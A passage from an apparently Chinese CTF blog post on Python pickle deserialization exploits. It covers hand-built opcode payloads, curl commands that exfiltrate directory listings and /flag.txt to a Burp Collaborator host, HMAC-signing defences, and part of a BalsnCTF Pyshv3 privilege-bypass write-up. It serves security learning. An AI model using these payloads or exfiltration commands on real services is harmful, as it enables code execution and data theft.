&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#39;(X\x04\x00\x00\x00flagi__main__\nread\n.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811193545692.png" alt="image-20210811193545692">&lt;/p>
&lt;p>再把这一部分的payload缝合到创建Animal实例的Opcode中去&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 原: name=&amp;#39;x&amp;#39;,category=&amp;#39;y&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">xq&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 缝合 应该能看出来改在哪里了&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Animal&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x00&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x01&lt;/span>&lt;span style="color:#d88200">}q&lt;/span>&lt;span style="color:#8045ff">\x02&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">nameq&lt;/span>&lt;span style="color:#8045ff">\x03&lt;/span>&lt;span style="color:#d88200">(X&lt;/span>&lt;span style="color:#8045ff">\x04\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">flagi__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">read&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">q&lt;/span>&lt;span style="color:#8045ff">\x04&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x08\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">categoryq&lt;/span>&lt;span style="color:#8045ff">\x05&lt;/span>&lt;span style="color:#d88200">X&lt;/span>&lt;span style="color:#8045ff">\x01\x00\x00\x00&lt;/span>&lt;span style="color:#d88200">yq&lt;/span>&lt;span style="color:#8045ff">\x06&lt;/span>&lt;span style="color:#d88200">ub.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210811195932427.png" alt="image-20210811195932427">&lt;/p>
&lt;h2 id="一些小技巧注意事项">一些小技巧&amp;amp;注意事项&lt;/h2>
&lt;ul>
&lt;li>当把payload作为get参数请求时，url编码注意换行符是%0A而不是%0D%0A&lt;/li>
&lt;li>对payload进行b64加密时，注意别把\n给单独编码了（不过正常都不会）&lt;/li>
&lt;li>其他模块的load也可以触发pickle反序列化漏洞&lt;/li>
&lt;/ul>
&lt;p>例如：&lt;code>numpy.load()&lt;/code>先尝试以numpy自己的数据格式导入，如果失败，则尝试以pickle的格式导入；&lt;code>pandas.read_pickle()&lt;/code>直接使用&lt;code>pickle.load()&lt;/code>方法&lt;/p>
&lt;ul>
&lt;li>灵活运用&lt;u>&lt;strong>burp collaborator&lt;/strong>&lt;/u>&lt;/li>
&lt;/ul>
&lt;p>虽然我们不能把burp提供的collaborator当作vps来使用，进行反弹shell然后一通操作，但是我们可以利用反引号+curl的方式直接获得代码执行和结果的输出；curl本身的用法也很多，可以直接带文件进行post，更多内容参见：&lt;a href="https://www.ruanyifeng.com/blog/2019/09/curl-reference.html">curl 的用法指南&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 基操1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl http://xxxx.burpcollaborator.net/`ls / | base64`)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 基操2 -d参数可以读取本地文件内容作为数据体发送，会自动添加请求头并调整请求方法 无需-X POST&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl -d &amp;#39;&lt;/span>&lt;span style="color:#f92672">@/&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">txt&lt;/span>&lt;span style="color:#d88200">&amp;#39; http://xxxx.burpcollaborator.net/)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="最后出于安全角度的考量">最后，出于安全角度的考量&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>禁用pickle，使用Json或Google Protocol Buffers&lt;/p>
&lt;/li>
&lt;li>
&lt;p>当确实需要使用pickle时，要确保对用户的输入进行过滤，比如重写&lt;code>find_class()&lt;/code>（使用白名单而不是黑名单进行过滤）、禁止某些操作符；由于在对opcode进行反序列化时可能会造成任意文件读写，一定提前对重要文件做好权限的管理；必要时可以对信息进行hmac签名&lt;/p>
&lt;/li>
&lt;li>
&lt;p>举一个hmac的栗子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">hmac&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">age&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">age&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__str__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;My name is &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">, I am &lt;/span>&lt;span style="color:#d88200">%d&lt;/span>&lt;span style="color:#d88200"> years old.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">age&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">HMAC_Pickler&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;|&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">secret_key&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">seperator&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">signer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">hmac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">new&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">secret_key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">signer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">hexdigest&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[:&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">):]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Data is tampered by someone.&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sign&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">digital_signature&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#d88200">%s%s%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sign&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seperator&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;7f54a0ab-6443-457c-ba20-2510ebbfb28f&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pickler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HMAC_Pickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Jack&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">19&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">&amp;#34;I am hacker, trying evil things&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickler&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
栗子9 - [BalsnCTF 2019] Pyshv3
&lt;/h4>
&lt;/summary>
&lt;p>这次的find_class()没有变化，但是structs有具体的实现&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812012841569.png" alt="image-20210812012841569">&lt;/p>
&lt;p>同时server.py的逻辑也发生了变化，不用rce了，直接有一个拿flag的函数，但需要self.user.privileged为True才可以返回&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013032487.png" alt="image-20210812013032487">&lt;/p>
&lt;p>而这个self.user.privileged在一开始就被设为了False&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210812013115089.png" alt="image-20210812013115089">&lt;/p>
&lt;p>emmmm 这怎么绕过捏？&lt;/p>
&lt;p>先说非预期，将&lt;code>__builtins__&lt;/code>复制到modules属性上；再说说预期解。&lt;/p>
&lt;p>我们知道，有&lt;code>__get__&lt;/code>，&lt;code>__set__&lt;/code>这样描述器协议方法的对象称为描述器descriptor。默认对属性的访问控制都是从对象的字典__dict__里面进行获取(get)，设置(set)和删除(delete)的方法（前面的那道题也用到这个点）。举例来说，&lt;code>a.x&lt;/code>的查找顺序是&lt;code>a.__dict__['x']&lt;/code>，之后&lt;code>type(a).__dict__['x']&lt;/code>，然后找type(a)的父类。如果查找到的值是一个描述器，python就会调用描述器的方法来重写默认的控制行为，这个重写发生在这个查找环节的哪里取决于定义了哪个描述器方法。（注意：只有在新式类中时描述器才起作用）（更多介绍参见：&lt;a href="https://foofish.net/what-is-descriptor-in-python.html">什么是描述符（descriptor）&lt;/a>）&lt;/p>
&lt;p>我们利用描述器的特性，将User类的&lt;code>__set__&lt;/code>方法重载为structs.User，并把它的privileged属性赋值为一个User实例。当进行self.user.privileged被赋值时触发&lt;code>__set__&lt;/code>，但由于已经被重写，所以并不会被赋值False，而是保持原样，还是一个User实例。在后面if判断时，User实例当然是True，就可以绕过了。&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__set__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;structs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;User&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
